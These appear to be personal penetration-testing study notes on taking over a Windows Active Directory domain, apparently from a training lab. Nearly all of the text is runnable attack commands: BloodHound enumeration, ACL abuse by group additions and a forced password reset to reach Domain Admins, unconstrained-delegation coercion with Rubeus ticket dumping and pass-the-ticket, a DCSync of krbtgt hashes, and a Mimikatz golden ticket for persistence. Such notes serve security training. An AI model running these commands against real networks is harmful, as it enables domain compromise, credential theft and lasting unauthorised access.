# Movement, Pivoting and Persistence in Domain

* ```Bloodhound``` used to visualize domain, its objects and relations between them:

  ```shell
  # upload sharphound.exe to victim system through shell

  sharphound.exe -c all
  # uses all collection methods
  # this creates a .zip file, which needs to be downloaded to attacker system

  # in attacker
  # start neo4j
  neo4j console

  bloodhound
  # runs and opens bloodhound in browser
  # use neo4j creds

  # drag and drop downloaded zip file in bloodhound gui
  ```

* In ```Bloodhound```, we can use the prebuilt queries to explore the relationships; queries like ```Find Shortest Paths to Domain Admins``` can be vital.

* Under any group, we can view the ```Abuse Info``` section under Help to get tips on privesc.

* Abusing ACLs:

  ```ps
  # upload Powerview to victim

  . .\powerview.ps1
  # load Powerview

  net user s.chisholm /domain
  # get domain info for victim user
  # based off of bloodhound info

  # this user is part of Sales
  # which has GenericAll relation to Engineering

  net group engineering s.chisholm /add /domain
  # add user to Engineering
  # this group has GenericAll to another group

  net group "IT ADMINS" s.chisholm /add /domain
  # add user to another group

  # this group has GenericAll relation to particular user
  # we can use Force Change Password method

  $SecPassword = ConvertTo-SecureString 'FallOutBoy1!' -AsPlainText -Force
  # store password of current user in variable

  $cred = New-Object System.Management.Automation.PSCredential('mayorsec\s.chisholm', $SecPassword)

  $UserPass = ConvertTo-SecureString 'NewPassword1!' -AsPlainText -Force
  # new password for target user

  Set-DomainUserPassword -Identity j.taylor -AccountPassword $UserPass -Credential $cred
  # force change password for user 'j.taylor'

  net user j.taylor /domain
  # part of Administrators

  Enter-PSSession -ComputerName dc01 -Credential mayorsec\j.taylor
  # enter remote PS session
  # we now have a session as j.taylor

  # this user, as part of Administrators, has WriteDacl to Domain Admins group
  # we can abuse that

  net group "Domain Admins" j.taylor /add /domain

  net group j.taylor /domain
  # part of Domain Admins now
  ```

* In ```Bloodhound```, the query ```Shortest Paths to Unconstrained Delegation Systems``` shows us how to exploit unconstrained delegation - for this to work, the target system needs to have the ```TrustedForDelegation``` property set to True:

  ```ps
  # assuming we have shell already on target system
  # in Covenant
  # upload ms-rprn.exe tool and PowerView

  powershell get-netcomputer -unconstrained -properites dnshostname
  # check for systems with unconstrained delegation

  shell ms-rprn.exe \\dc01 \\workstation-02
  # where dc01 is the target and workstation-02 is the current system

  rubeus dump /service:krbtgt
  # dumps ticket

  maketoken administrator mayorsec randompass
  # token impersonation

  rubeus ptt /ticket:<ticket>
  # use ticket found from the dump earlier
  # pass the ticket

  # domain admin

  dcsync mayorsec\krbtgt
  # dumps krbtgt hashes
  ```

* Golden ticket persistence:

  ```ps
  # after getting domain admin
  # upload invoke-mimikatz.ps1 and powerview.ps1 tools

  . .\powerview.ps1

  get-domainsid
  # reqd for ticket attack

  . .\invoke-mimikatz.ps1

  Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:mayorsec.local /sid:<domain SID> /krbtgt:<NTLM hash for krbtgt> /ptt"'
  # full admin priv by pass the ticket

  ls \\dc01\C$
  # verify admin priv
  ```
